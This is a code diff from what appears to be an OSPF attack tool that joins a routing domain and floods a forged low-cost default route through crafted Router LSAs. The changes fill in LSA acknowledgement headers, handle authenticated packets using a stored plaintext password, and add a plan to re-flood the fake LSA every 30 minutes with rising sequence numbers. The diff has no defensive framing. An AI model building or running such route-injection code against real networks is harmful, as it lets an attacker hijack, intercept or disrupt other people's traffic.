@@ -598,6 +598,7 @@ self.config.area,
 
         self.inject_low_cost_route(nb)
 
+    # TODO: RESEND LSA EVERY 30 min with increasing seq num
     def inject_low_cost_route(self, nb: Neighbour) -> None:
         """Construct and floods fake default route"""
         # Craft Type 1 Router LSA
@@ -634,7 +635,7 @@ self.config.area,
                 )
 
         # Sending to ALL_DR_ROUTERS didn't work but ALL_SPF_ROUTERS did
-        # dr will intercept and validate against our FULL adjacency
+        # DR will intercept and validate against our FULL adjacency
         self._send_ospf(
                 dst_ip=ALL_SPF_ROUTERS,
                 dst_mac=ALL_SPF_ROUTERS_MAC,
@@ -665,15 +666,14 @@ self.config.area,
         """Sends and Builds LSAck packets"""
         headers = [
                 OSPF_LSA_Hdr(
-                    # Commented out means not required for LSAck
-                    # age=lsa.age if hasattr(lsa, "age") else 10,
-                    # options=lsa.options,
+                    age=lsa.age if hasattr(lsa, "age") else 10,
+                    options=lsa.options,
                     type=lsa.type,
                     id=lsa.id,
                     adrouter=lsa.adrouter,
-                    # seq=lsa.seq,
-                    # chksum=lsa.chksum,
-                    # len=lsa.len,
+                    seq=lsa.seq,
+                    chksum=lsa.chksum,
+                    len=lsa.len,
                     )
                 for lsa in lsas
                 ]
@@ -768,7 +768,6 @@ self.config.area,
                         keyid=self.config.key_id,
                         authdatalen=self.config.authdata_len,
                         seq=self.config.authseq,
-                        # key=self.config.plaintext_pw
                         ) /
                 payload
             )
@@ -782,7 +781,7 @@ self.config.area,
             # Run hashing on stored plaintext password
             generated_hash = hash_password(self.config.plaintext_pw, ospf_packet)
 
-            LOG.debug(f"generated hash: {generated_hash.hex()}")
+            # LOG.debug(f"generated hash: {generated_hash.hex()}")
 
             full_ospf_packet = ospf_packet + generated_hash
 
